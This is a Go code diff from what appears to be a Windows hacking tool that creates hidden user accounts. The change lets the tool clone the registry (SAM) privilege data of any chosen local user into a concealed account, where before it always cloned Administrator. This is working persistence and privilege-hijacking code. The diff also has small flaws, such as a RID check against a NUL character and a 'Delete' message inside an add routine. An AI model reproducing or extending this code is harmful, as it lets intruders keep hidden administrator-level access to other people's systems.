@@ -23,10 +23,23 @@ type UserRegistry struct {
 	V                       []byte
 }
 
-func EditRegistry(username string) {
+func EditRegistry(username, cloneuser string) {
+	t := 0
+	systemname, _ := ListLocalUsers()
+	for _, i := range systemname {
+		if i.Username == cloneuser {
+			t++
+		}
+	}
+	if t == 0 {
+		fmt.Printf("[-] Not Found %s user", cloneuser)
+		fmt.Println("[-] Failed to add hidden user.")
+		os.Exit(3)
+	}
+	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users\\Names\\" + cloneuser)
 	// 1. Get User RID
 	NamesUserNamePath := "SAM\\SAM\\Domains\\Account\\Users\\Names\\" + username
-	NamesAdministratorPath := "SAM\\SAM\\Domains\\Account\\Users\\Names\\Administrator"
+	NamesAdministratorPath := "SAM\\SAM\\Domains\\Account\\Users\\Names\\" + cloneuser
 
 	_, UserNameIntRID := GetRegistryValue(NamesUserNamePath, "")
 	_, AdministratorIntRID := GetRegistryValue(NamesAdministratorPath, "")
@@ -34,9 +47,14 @@ func EditRegistry(username string) {
 	UserNameRID := strconv.FormatUint(uint64(UserNameIntRID), 16)
 	fmt.Printf("[+] %s RID: %v\n", username, strings.ToUpper(UserNameRID))
 	UserNameHexRID := "00000" + UserNameRID
+	if UserNameRID == string(0) {
+		fmt.Println("Failed to get user RID value.")
+		fmt.Printf("[-] Failed to Delete %s User\n", username)
+		os.Exit(3)
+	}
 
 	AdministratorRID := strconv.FormatUint(uint64(AdministratorIntRID), 16)
-	fmt.Printf("[+] Administrator RID: %v\n", strings.ToUpper(AdministratorRID))
+	fmt.Printf("[+] %s RID: %v\n", cloneuser, strings.ToUpper(AdministratorRID))
 	AdministratorHexRID := "00000" + AdministratorRID
 
 	UsersUserNamePath := "SAM\\SAM\\Domains\\Account\\Users\\" + strings.ToUpper(UserNameHexRID)
@@ -86,7 +104,7 @@ func EditRegistry(username string) {
 
 	// 6. Enable User
 	EnableUser(username)
-	
+
 	k := 0
 	HiddenAccounts := CheckHiddenAccountsSub()
 	for _, i := range HiddenAccounts {
